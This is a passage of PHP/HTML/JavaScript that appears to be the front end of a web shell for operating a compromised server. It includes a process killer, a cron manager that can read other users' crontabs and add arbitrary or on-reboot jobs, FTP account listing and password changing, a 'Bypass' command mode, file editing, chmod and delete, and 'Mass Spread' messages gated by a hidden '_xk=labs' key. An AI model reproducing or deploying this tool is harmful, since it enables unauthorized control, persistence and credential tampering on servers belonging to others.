                    <option value="hidden">Hidden Only</option>
                    <option value="recent">Recent (5min)</option>
                </select>
                <select id="procSort" class="form-input" style="width:auto;padding:5px 8px;font-size:11px;" onchange="procFilterRender()">
                    <option value="cpu">Sort: CPU</option>
                    <option value="mem">Sort: MEM</option>
                    <option value="pid">Sort: PID</option>
                    <option value="start">Sort: Start</option>
                </select>
            </div>

            <!-- Alert badges -->
            <div id="procAlerts" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;"></div>

            <!-- Process table -->
            <div style="flex:1;overflow:auto;border:1px solid var(--border);border-radius:6px;">
                <table style="width:100%;border-collapse:collapse;font-size:11px;">
                    <thead>
                        <tr style="background:var(--bg-secondary);position:sticky;top:0;z-index:1;">
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">PID</th>
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">USER</th>
                            <th style="padding:6px 8px;text-align:right;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">CPU%</th>
                            <th style="padding:6px 8px;text-align:right;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">MEM%</th>
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">STAT</th>
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">START</th>
                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);">COMMAND</th>
                            <th style="padding:6px 8px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">ACTION</th>
                        </tr>
                    </thead>
                    <tbody id="procTableBody">
                        <tr><td colspan="8" style="text-align:center;padding:30px;color:var(--text-muted);">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
<style>
@keyframes procPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
.proc-row:hover { background: rgba(236,72,153,0.06) !important; }
.proc-hidden { border-left: 3px solid #f85149 !important; background: rgba(248,81,73,0.06) !important; }
.proc-recent { border-left: 3px solid #3fb950 !important; background: rgba(63,185,80,0.06) !important; }
.proc-high-cpu { color: #f85149 !important; font-weight: 700; }
.proc-high-mem { color: #f97316 !important; font-weight: 700; }
</style>

<!-- Process Kill Confirm -->
<div class="modal-overlay hidden" id="procKillModal" style="z-index: 1001;">
    <div class="modal" style="max-width: 380px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #f85149;">Kill Process</span>
            <button class="modal-close" onclick="hideModal('procKill')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="color:var(--text-muted);font-size:12px;">Kill PID <strong id="procKillPid" style="color:#f85149;"></strong>?</p>
            <p id="procKillCmd" style="color:var(--text-muted);font-size:10px;font-family:monospace;word-break:break-all;margin-top:4px;"></p>
            <div style="display:flex;gap:6px;margin-top:12px;justify-content:flex-end;">
                <button class="btn btn-sm btn-secondary" onclick="hideModal('procKill')">Cancel</button>
                <button class="btn btn-sm" style="background:#f97316;border-color:#f97316;color:#fff;" onclick="procDoKill('15')">SIGTERM</button>
                <button class="btn btn-sm btn-danger" onclick="procDoKill('9')">SIGKILL</button>
            </div>
        </div>
    </div>
</div>

<!-- Cronjob Manager Modal -->
<div class="modal-overlay hidden" id="cronModal">
    <div class="modal" style="max-width: 1050px; max-height: 92vh; overflow: hidden; display: flex; flex-direction: column;">
        <div class="modal-header" style="flex-shrink: 0;">
            <span class="modal-title" style="color: #06b6d4;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                Cronjob Manager
                <span id="cronLiveIndicator" style="display:inline-block;width:8px;height:8px;background:#3fb950;border-radius:50%;margin-left:8px;animation:cronPulse 1s infinite;vertical-align:middle;"></span>
                <span style="font-size:10px;color:#3fb950;margin-left:4px;font-weight:400;">LIVE</span>
            </span>
            <div style="display:flex;align-items:center;gap:8px;">
                <span id="cronStats" style="font-size:10px;color:var(--text-muted);"></span>
                <button class="btn btn-sm btn-secondary" onclick="cronTogglePause()" id="cronPauseBtn" style="padding:3px 10px;font-size:10px;">Pause</button>
                <button class="btn btn-sm" style="background:#06b6d4;border-color:#06b6d4;color:#fff;padding:3px 10px;font-size:10px;" onclick="cronToggleRaw()" id="cronRawBtn">Raw Edit</button>
                <button class="modal-close" onclick="cronStopAndClose()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
            </div>
        </div>
        <div class="modal-body" style="flex: 1; overflow: hidden; display: flex; flex-direction: column; padding: 10px 14px;">
            <!-- Add new cron -->
            <div style="display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap;align-items:center;">
                <select id="cronPreset" class="form-input" style="width:auto;padding:5px 8px;font-size:11px;" onchange="cronApplyPreset()">
                    <option value="">Schedule preset...</option>
                    <option value="* * * * *">Every minute</option>
                    <option value="*/5 * * * *">Every 5 min</option>
                    <option value="*/15 * * * *">Every 15 min</option>
                    <option value="*/30 * * * *">Every 30 min</option>
                    <option value="0 * * * *">Every hour</option>
                    <option value="0 */6 * * *">Every 6 hours</option>
                    <option value="0 */12 * * *">Every 12 hours</option>
                    <option value="0 0 * * *">Daily midnight</option>
                    <option value="0 0 * * 0">Weekly Sunday</option>
                    <option value="0 0 1 * *">Monthly 1st</option>
                    <option value="@reboot">On reboot</option>
                </select>
                <input type="text" id="cronSchedule" class="form-input" placeholder="* * * * *" style="width:120px;padding:5px 8px;font-size:11px;font-family:monospace;">
                <input type="text" id="cronCommand" class="form-input" placeholder="Command to run..." style="flex:1;min-width:200px;padding:5px 8px;font-size:11px;font-family:monospace;">
                <button class="btn btn-sm" style="background:#06b6d4;border-color:#06b6d4;color:#fff;padding:5px 12px;font-size:11px;" onclick="cronAdd()">Add</button>
            </div>

            <!-- Tabs -->
            <div style="display:flex;gap:4px;margin-bottom:8px;">
                <button class="btn btn-sm btn-secondary" id="cronTabUser" onclick="cronSwitchTab('user')" style="padding:3px 10px;font-size:10px;border-color:#06b6d4;color:#06b6d4;">My Crontab</button>
                <button class="btn btn-sm btn-secondary" id="cronTabSys" onclick="cronSwitchTab('sys')" style="padding:3px 10px;font-size:10px;">System Crons</button>
                <button class="btn btn-sm btn-secondary" id="cronTabOther" onclick="cronSwitchTab('other')" style="padding:3px 10px;font-size:10px;">Other Users</button>
            </div>

            <!-- Raw editor (hidden by default) -->
            <div id="cronRawEditor" style="display:none;margin-bottom:8px;">
                <textarea id="cronRawText" class="form-input" style="width:100%;height:150px;font-family:monospace;font-size:11px;padding:8px;resize:vertical;background:var(--bg-secondary);color:var(--text-primary);border:1px solid var(--border);border-radius:6px;" placeholder="# Edit crontab raw content..."></textarea>
                <div style="display:flex;gap:6px;margin-top:6px;justify-content:flex-end;">
                    <button class="btn btn-sm btn-secondary" onclick="cronToggleRaw()" style="font-size:10px;">Cancel</button>
                    <button class="btn btn-sm" style="background:#06b6d4;border-color:#06b6d4;color:#fff;font-size:10px;" onclick="cronSaveRaw()">Save Crontab</button>
                </div>
            </div>

            <!-- User crontab table -->
            <div id="cronUserTab" style="flex:1;overflow:auto;border:1px solid var(--border);border-radius:6px;">
                <table style="width:100%;border-collapse:collapse;font-size:11px;">
                    <thead><tr style="background:var(--bg-secondary);position:sticky;top:0;z-index:1;">
                        <th style="padding:6px 8px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);width:30px;">#</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Status</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Schedule</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);">Command</th>
                        <th style="padding:6px 8px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Actions</th>
                    </tr></thead>
                    <tbody id="cronUserBody"><tr><td colspan="5" style="text-align:center;padding:30px;color:var(--text-muted);">Loading...</td></tr></tbody>
                </table>
            </div>

            <!-- System crons -->
            <div id="cronSysTab" style="flex:1;overflow:auto;border:1px solid var(--border);border-radius:6px;display:none;">
                <table style="width:100%;border-collapse:collapse;font-size:11px;">
                    <thead><tr style="background:var(--bg-secondary);position:sticky;top:0;z-index:1;">
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Directory</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">File</th>
                        <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);">Content</th>
                        <th style="padding:6px 8px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">Writable</th>
                    </tr></thead>
                    <tbody id="cronSysBody"></tbody>
                </table>
            </div>

            <!-- Other users -->
            <div id="cronOtherTab" style="flex:1;overflow:auto;border:1px solid var(--border);border-radius:6px;display:none;">
                <div id="cronOtherBody" style="padding:10px;color:var(--text-muted);font-size:11px;">Loading...</div>
            </div>

            <!-- /etc/crontab -->
            <div id="cronEtcSection" style="margin-top:8px;">
                <div style="font-size:10px;color:var(--text-muted);font-weight:600;margin-bottom:4px;">/etc/crontab</div>
                <pre id="cronEtcContent" style="background:var(--bg-secondary);border:1px solid var(--border);border-radius:6px;padding:8px;font-size:10px;color:var(--text-primary);max-height:100px;overflow:auto;margin:0;white-space:pre-wrap;word-break:break-all;"></pre>
            </div>
        </div>
    </div>
</div>
<style>
@keyframes cronPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
.cron-row:hover { background: rgba(6,182,212,0.06) !important; }
.cron-disabled { opacity: 0.5; }
.cron-var { color: #f97316 !important; font-style: italic; }

/* === TOAST NOTIFICATIONS === */
#toastContainer {
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 99999;
    display: flex;
    flex-direction: column;
    gap: 10px;
    pointer-events: none;
}
.toast-item {
    pointer-events: auto;
    display: flex;
    align-items: center;
    gap: 10px;
    min-width: 300px;
    max-width: 460px;
    padding: 12px 16px;
    border-radius: 10px;
    font-size: 12px;
    font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
    color: #fff;
    backdrop-filter: blur(16px);
    -webkit-backdrop-filter: blur(16px);
    box-shadow: 0 8px 32px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.05);
    transform: translateX(120%);
    opacity: 0;
    animation: toastSlideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
    transition: transform 0.2s, box-shadow 0.2s;
    overflow: hidden;
}
.toast-item:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.08); }
.toast-item.toast-removing { animation: toastSlideOut 0.35s cubic-bezier(0.55, 0, 1, 0.45) forwards; }

.toast-success {
    background: linear-gradient(135deg, rgba(22, 163, 74, 0.92), rgba(16, 120, 56, 0.92));
    border-left: 4px solid #3fb950;
}
.toast-error {
    background: linear-gradient(135deg, rgba(220, 38, 38, 0.92), rgba(160, 28, 28, 0.92));
    border-left: 4px solid #f85149;
}
.toast-warning {
    background: linear-gradient(135deg, rgba(234, 179, 8, 0.92), rgba(180, 130, 0, 0.92));
    border-left: 4px solid #ffd700;
}
.toast-info {
    background: linear-gradient(135deg, rgba(6, 142, 182, 0.92), rgba(8, 100, 136, 0.92));
    border-left: 4px solid #06b6d4;
}
.toast-icon {
    flex-shrink: 0;
    width: 28px;
    height: 28px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    background: rgba(255,255,255,0.15);
}
.toast-body { flex: 1; min-width: 0; }
.toast-title { font-weight: 700; font-size: 12px; margin-bottom: 2px; letter-spacing: 0.3px; }
.toast-msg { font-size: 11px; opacity: 0.85; line-height: 1.4; word-break: break-word; }
.toast-progress {
    position: absolute;
    bottom: 0;
    left: 0;
    height: 3px;
    background: rgba(255,255,255,0.35);
    border-radius: 0 0 0 10px;
    animation: toastProgress linear forwards;
}
.toast-close {
    flex-shrink: 0;
    width: 22px;
    height: 22px;
    border-radius: 50%;
    border: none;
    background: rgba(255,255,255,0.12);
    color: rgba(255,255,255,0.7);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 13px;
    line-height: 1;
    transition: background 0.15s;
}
.toast-close:hover { background: rgba(255,255,255,0.25); }
@keyframes toastSlideIn { 0% { transform: translateX(120%); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }
@keyframes toastSlideOut { 0% { transform: translateX(0); opacity: 1; } 100% { transform: translateX(120%); opacity: 0; } }
@keyframes toastProgress { 0% { width: 100%; } 100% { width: 0%; } }

/* PHP-rendered message bars (hidden by JS, fallback display) */
.msg-success, .msg-error {
    padding: 10px 14px;
    border-radius: 8px;
    font-size: 12px;
    margin-bottom: 12px;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 8px;
    animation: msgFadeIn 0.3s ease;
}
.msg-success {
    background: rgba(63, 185, 80, 0.12);
    border: 1px solid rgba(63, 185, 80, 0.3);
    color: #3fb950;
}
.msg-error {
    background: rgba(248, 81, 73, 0.12);
    border: 1px solid rgba(248, 81, 73, 0.3);
    color: #f85149;
}
@keyframes msgFadeIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
</style>

<!-- Ace Editor -->
<style>
#editCmWrap { height:55vh; border-radius:6px; overflow:hidden; border:1px solid var(--border); font-size:12px; }
#editCmWrap .ace_editor { height:100%; font-family:'SF Mono','Cascadia Code','Consolas',monospace !important; font-size:12px !important; }
</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.9/ace.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.9/ext-language_tools.min.js"></script>

<!-- Cursor Resize Script -->
<script>
(function(){
    var CURSOR_SIZE = 28;
    var POINTER_SIZE = 32;
    var cursorUrls = {
        normal: 'https://cdn.custom-cursor.com/db/7600/32/stain-of-paint-cursor.png',
        pointer: 'https://cdn.custom-cursor.com/db/7599/32/stain-of-paint-pointer.png'
    };
    function resizeCursor(url, size, hotX, hotY, cb) {
        var img = new Image();
        img.crossOrigin = 'anonymous';
        img.onload = function() {
            var c = document.createElement('canvas');
            c.width = size; c.height = size;
            var ctx = c.getContext('2d');
            ctx.drawImage(img, 0, 0, size, size);
            cb(c.toDataURL('image/png'), hotX, hotY);
        };
        img.onerror = function() { cb(null); };
        img.src = url;
    }
    resizeCursor(cursorUrls.normal, CURSOR_SIZE, 4, 2, function(dataUrl) {
        if (!dataUrl) return;
        var style = document.createElement('style');
        style.id = 'cursor-normal';
        style.textContent = '*, *::before, *::after { cursor: url("' + dataUrl + '") 4 2, default !important; }';
        document.head.appendChild(style);
        resizeCursor(cursorUrls.pointer, POINTER_SIZE, 8, 4, function(pUrl) {
            if (!pUrl) return;
            var s2 = document.createElement('style');
            s2.id = 'cursor-pointer';
            s2.textContent = 'a,button,[onclick],select,option,label,summary,'
                + 'input[type="submit"],input[type="button"],input[type="checkbox"],input[type="radio"],input[type="file"],'
                + '.btn,.btn-sm,.action-btns a,.modal-close,.toast-item,.toast-close,'
                + '.file-row:hover .action-btns a,.nav-link,.tab-btn,.breadcrumb a,'
                + '.file-checkbox,[role="button"],.upload-label'
                + '{ cursor: url("' + pUrl + '") 8 4, pointer !important; }';
            document.head.appendChild(s2);
        });
    });
})();
</script>

<!-- Toast Container -->
<div id="toastContainer"></div>

<script>
var _LPSELF = '<?php echo addslashes($_SERVER['PHP_SELF'] ?? $_SERVER['SCRIPT_NAME'] ?? ''); ?>';
var _LPDIR  = '<?php echo addslashes(dirname(__FILE__)); ?>';
window._currentDir = '<?php echo addslashes($currentDirectory ?? dirname(__FILE__)); ?>';

var _sndUrls = {
    fbi: 'https://www.myinstants.com/media/sounds/fbi-open-up-sfx.mp3',
    applepay: 'https://www.myinstants.com/media/sounds/applepay.mp3',
    catlaugh: 'https://www.myinstants.com/media/sounds/cat-laught.mp3',
    fahhh: 'https://www.myinstants.com//media/sounds/fahhh_KcgAXfs.mp3'
};
var _sndPlaying = {};
function playSound(name) {
    if (_sndPlaying[name]) return;
    var url = _sndUrls[name];
    if (!url) return;
    _sndPlaying[name] = true;
    try {
        var audio = new Audio(url);
        audio.volume = 0.7;
        audio.onended = function() { _sndPlaying[name] = false; };
        audio.onerror = function() { _sndPlaying[name] = false; };
        var p = audio.play();
        if (p && p.catch) p.catch(function() { _sndPlaying[name] = false; });
        setTimeout(function() { _sndPlaying[name] = false; }, 10000);
    } catch(e) { _sndPlaying[name] = false; }
}
function playFailSound() {
    var fail = ['catlaugh', 'fahhh'];
    playSound(fail[Math.floor(Math.random() * fail.length)]);
}
(function() {
    ['applepay','catlaugh','fahhh','fbi'].forEach(function(name) {
        try { fetch(_sndUrls[name], {mode:'cors'}).catch(function(){}); } catch(e){}
    });
})();


var toastIcons = {
    success: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>',
    error: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
    warning: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
    info: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>'
};
var toastTitles = { success: 'Success', error: 'Error', warning: 'Warning', info: 'Info' };

function fileActionRequest(data, callback) {
    var form = new FormData();
    form.append('_xk', 'labs');
    for (var key in data) { if (data.hasOwnProperty(key)) form.append(key, data[key]); }
    fetch(_LPSELF, {
        method: 'POST', body: form
    }).then(function(r) { return r.json(); }).then(callback).catch(function(e) {
        callback({err: e.message || 'Network error'});
    });
}

function showToast(message, type, duration, sound) {
    type = type || 'success';
    duration = duration || 4000;
    if (sound) playSound(sound);
    var container = document.getElementById('toastContainer');
    var toast = document.createElement('div');
    toast.className = 'toast-item toast-' + type;
    toast.style.position = 'relative';
    toast.innerHTML = '<div class="toast-icon">' + (toastIcons[type] || toastIcons.info) + '</div>'
        + '<div class="toast-body"><div class="toast-title">' + toastTitles[type] + '</div><div class="toast-msg">' + message + '</div></div>'
        + '<button class="toast-close" onclick="removeToast(this.parentElement)">&times;</button>'
        + '<div class="toast-progress" style="animation-duration:' + duration + 'ms;"></div>';
    container.appendChild(toast);
    toast.addEventListener('click', function(e) { if (e.target.tagName !== 'BUTTON') removeToast(toast); });
    setTimeout(function() { removeToast(toast); }, duration);
}

function removeToast(el) {
    if (!el || el.classList.contains('toast-removing')) return;
    el.classList.add('toast-removing');
    setTimeout(function() { if (el.parentNode) el.parentNode.removeChild(el); }, 350);
}

var _pageToastFired = false;
(function() {
    var url = new URL(window.location.href);
    var msg = url.searchParams.get('msg');
    if (msg === 'deleted') {
        _pageToastFired = true;
        setTimeout(function() { showToast('Item deleted successfully', 'success', 4000, 'applepay'); }, 300);
        url.searchParams.delete('msg');
        window.history.replaceState({}, '', url.pathname + url.search);
    }

    if (!_pageToastFired) {
        var successDiv = document.querySelector('.msg-success');
        if (successDiv) {
            var txt = successDiv.textContent.trim();
            successDiv.style.display = 'none';
            if (txt) {
                _pageToastFired = true;
                var toastTxt = txt;
                if (txt.indexOf('File Uploaded') !== -1 || txt.indexOf('Uploaded') !== -1) toastTxt = 'Success Upload';
                else if (txt.indexOf('Mass Spread') !== -1 || txt.indexOf('spread') !== -1) toastTxt = 'Mass Spread Complete';
                setTimeout(function() { showToast(toastTxt, 'success', 5000, 'applepay'); }, 200);
            }
        }
    } else {
        var sd = document.querySelector('.msg-success'); if (sd) sd.style.display = 'none';
    }
    var errorDiv = document.querySelector('.msg-error');
    if (errorDiv) {
        var txt2 = errorDiv.textContent.trim();
        errorDiv.style.display = 'none';
        if (txt2) setTimeout(function() { showToast(txt2, 'error', 5000); playFailSound(); }, 200);
    }
})();

<?php if ($justLoggedIn): ?>
(function() {
    setTimeout(function() {
        showToast('Access Granted. Welcome back, operator.', 'success', 6000, 'fbi');
    }, 600);
})();
<?php endif; ?>

function showModal(type) {
    document.getElementById(type + 'Modal').classList.remove('hidden');
    if (type === 'wp' && typeof wpLoadUsers === 'function') wpLoadUsers();
    if (type === 'ftp') ftpAutoLoad();
    if (type === 'proc') procStart();
    if (type === 'cron') cronStart();
}
function hideModal(type) { document.getElementById(type + 'Modal').classList.add('hidden'); }

var ftpLoaded = <?php echo (!empty($ftpAccounts) || isset($_POST['ftp_list'])) ? 'true' : 'false'; ?>;
function ftpAutoLoad() {
    if (ftpLoaded) return;
    ftpLoaded = true;
    var form = document.createElement('form');
    form.method = 'POST';
    form.style.display = 'none';
    var inp = document.createElement('input');
    inp.type = 'hidden';
    inp.name = 'ftp_list';
    inp.value = '1';
    form.appendChild(inp);
    document.body.appendChild(form);
    form.submit();
}

var bypassMode = false;
function toggleBypass() {
    bypassMode = !bypassMode;
    var btn = document.getElementById('bypassToggle');
    var field = document.getElementById('useBypassField');
    var label = document.getElementById('cmdModeLabel');
    if (bypassMode) {
        btn.textContent = 'Bypass';
        btn.className = 'btn btn-sm btn-danger';
        btn.style.cssText = 'padding:4px 8px;font-size:10px;min-width:52px;background:#f85149;border-color:#f85149;color:#fff;';
        field.value = '1';
        label.textContent = '#';
        label.style.color = '#f85149';
    } else {
        btn.textContent = 'Normal';
        btn.className = 'btn btn-sm btn-secondary';
        btn.style.cssText = 'padding:4px 8px;font-size:10px;min-width:52px;';
        field.value = '0';
        label.textContent = '$';
        label.style.color = '';
    }
}

function ftpChgPass(user, domain) {
    var panels = document.querySelectorAll('[id^="ftpChg_"]');
    panels.forEach(function(p) { p.classList.add('hidden'); });
    for (var i = 0; i < 100; i++) {
        var el = document.getElementById('ftpChg_' + i);
        if (!el) break;
        var form = el.querySelector('form');
        if (form) {
            var uInput = form.querySelector('[name="ftp_chg_user"]');
            var dInput = form.querySelector('[name="ftp_chg_domain"]');
            if (uInput && dInput && uInput.value === user && dInput.value === domain) {
                el.classList.toggle('hidden');
                if (!el.classList.contains('hidden')) {
                    el.querySelector('[name="ftp_chg_pass"]').focus();
                }
                break;
            }
        }
    }
}

function showDeleteConfirm(path, name) {
    document.getElementById('deleteFileName').textContent = decodeURIComponent(name);
    document.getElementById('deleteConfirmBtn').href = '?del=' + path + '&_xk=labs';
    document.getElementById('deleteConfirmModal').classList.remove('hidden');
}
function hideDeleteConfirm() { document.getElementById('deleteConfirmModal').classList.add('hidden'); }


function fileActionRequest(data, callback) {
    var form = new FormData();
    form.append('_xk', 'labs');
    for (var key in data) { if (Object.prototype.hasOwnProperty.call(data, key)) form.append(key, data[key]); }
    fetch(_LPSELF, {
        method: 'POST', body: form
    }).then(function(r) {
        return r.text();
    }).then(function(txt) {
        try { callback(JSON.parse(txt)); }
        catch(e) { callback({err: 'Invalid response: ' + txt.substring(0, 120)}); }
    }).catch(function(e) {
        callback({err: e.message || 'Network error'});
    });
}


var _aceEditor = null;

function _aceModeForFile(name) {
    var ext = (name.split('.').pop() || '').toLowerCase();
    var map = {
        'php':'ace/mode/php','html':'ace/mode/html','htm':'ace/mode/html',
        'js':'ace/mode/javascript','jsx':'ace/mode/javascript',
        'ts':'ace/mode/typescript','tsx':'ace/mode/typescript',
        'json':'ace/mode/json','css':'ace/mode/css','scss':'ace/mode/scss',
        'less':'ace/mode/less','py':'ace/mode/python','sh':'ace/mode/sh',
        'bash':'ace/mode/sh','sql':'ace/mode/sql','xml':'ace/mode/xml',
        'svg':'ace/mode/xml','yaml':'ace/mode/yaml','yml':'ace/mode/yaml',
        'md':'ace/mode/markdown','txt':'ace/mode/text','ini':'ace/mode/ini',
        'conf':'ace/mode/apache_conf','htaccess':'ace/mode/apache_conf',
        'java':'ace/mode/java','c':'ace/mode/c_cpp','cpp':'ace/mode/c_cpp',
        'rb':'ace/mode/ruby','go':'ace/mode/golang','rs':'ace/mode/rust'
    };
    return map[ext] || 'ace/mode/text';
}

function _aceGetOrCreate() {
    if (_aceEditor) return _aceEditor;
    var wrap = document.getElementById('editCmWrap');
    wrap.innerHTML = '<div id="aceEditorInner" style="position:absolute;top:0;right:0;bottom:0;left:0;"></div>';
    wrap.style.position = 'relative';
    _aceEditor = ace.edit('aceEditorInner');
    _aceEditor.setTheme('ace/theme/monokai');
    _aceEditor.setOptions({
        fontSize: '12px',
        fontFamily: "'SF Mono','Cascadia Code','Consolas',monospace",
        showLineNumbers: true,
        showGutter: true,
        highlightActiveLine: true,
        enableBasicAutocompletion: true,
        enableSnippets: true,
        enableLiveAutocompletion: false,
        tabSize: 4,
        useSoftTabs: true,
        wrap: false,
        showPrintMargin: false
    });
    return _aceEditor;
}

function showEditModal(path) {
    var fileName = path.split('/').pop();
    document.getElementById('editFilePath').value = path;
    document.getElementById('editFileName').textContent = fileName;
    document.getElementById('editLoading').style.display = '';
    document.getElementById('editCmWrap').style.display = 'none';
    document.getElementById('editSaveBtn').disabled = true;
    document.getElementById('editFileModal').classList.remove('hidden');

    fileActionRequest({file_action: 'get_content', file_path: path}, function(r) {
        var decoded = '', hasErr = false;
        if (r.err) {
            decoded = 'Error: ' + r.err; hasErr = true;
        } else {
            decoded = r.content || '';
            if (r.encoded) { try { decoded = atob(decoded); } catch(e) {} }
        }
        document.getElementById('editFileContent').value = decoded;
        document.getElementById('editLoading').style.display = 'none';
        document.getElementById('editCmWrap').style.display = '';

        var ed = _aceGetOrCreate();
        ed.session.setMode(_aceModeForFile(fileName));
        ed.setReadOnly(hasErr);
        ed.setValue(decoded, -1); // -1 = cursor at start
        ed.session.getUndoManager().reset();
        ed.resize();
        setTimeout(function() { ed.focus(); }, 30);
        if (!hasErr) document.getElementById('editSaveBtn').disabled = false;
    });
}

function hideEditModal() {
    document.getElementById('editFileModal').classList.add('hidden');
    if (_aceEditor) { _aceEditor.setValue(''); _aceEditor.session.getUndoManager().reset(); }
}
function saveEditFile() {
    var path = document.getElementById('editFilePath').value;
    var content = _aceEditor ? _aceEditor.getValue() : document.getElementById('editFileContent').value;
    var btn = document.getElementById('editSaveBtn');
    btn.disabled = true;
    btn.textContent = 'Saving...';
    var saveBtnReset = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg> Save File';
    fileActionRequest({file_action: 'save_content', file_path: path, file_content: content}, function(r) {
        if (r.ok) {
            showToast('File saved successfully: <b>' + path.split('/').pop() + '</b>', 'success', 4000, 'applepay');
            btn.textContent = 'Saved!';
            btn.style.background = '#3fb950';
            btn.style.borderColor = '#3fb950';
            setTimeout(function() { btn.disabled = false; btn.innerHTML = saveBtnReset; btn.style.background = ''; btn.style.borderColor = ''; }, 1500);
        } else {
            showToast('Failed to save file: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
            btn.textContent = 'Error!';
            btn.style.background = '#f85149';
            btn.style.borderColor = '#f85149';
            setTimeout(function() { btn.disabled = false; btn.innerHTML = saveBtnReset; btn.style.background = ''; btn.style.borderColor = ''; }, 2000);
        }
    });
}


function showRenameModal(path, name) {
    document.getElementById('renameFilePath').value = path;
    document.getElementById('renameCurrentName').textContent = name;
    document.getElementById('renameNewName').value = name;
    document.getElementById('renameModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('renameNewName').focus(); document.getElementById('renameNewName').select(); }, 100);
}
function hideRenameModal() { document.getElementById('renameModal').classList.add('hidden'); }
function doRename() {
    var path = document.getElementById('renameFilePath').value;
    var newName = document.getElementById('renameNewName').value.trim();
    if (!newName) { showToast('Please enter a new name', 'warning'); return; }
    fileActionRequest({file_action: 'rename', file_path: path, new_name: newName}, function(r) {
        if (r.ok) {
            showToast('Renamed to <b>' + newName + '</b> successfully', 'success', 4000, 'applepay');
            hideRenameModal();
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Rename failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}


function showChmodModal(path, name, currentPerm) {
    document.getElementById('chmodFilePath').value = path;
    document.getElementById('chmodFileName').textContent = name;
    document.getElementById('chmodCurrentPerm').textContent = currentPerm;
    document.getElementById('chmodNewPerm').value = currentPerm;
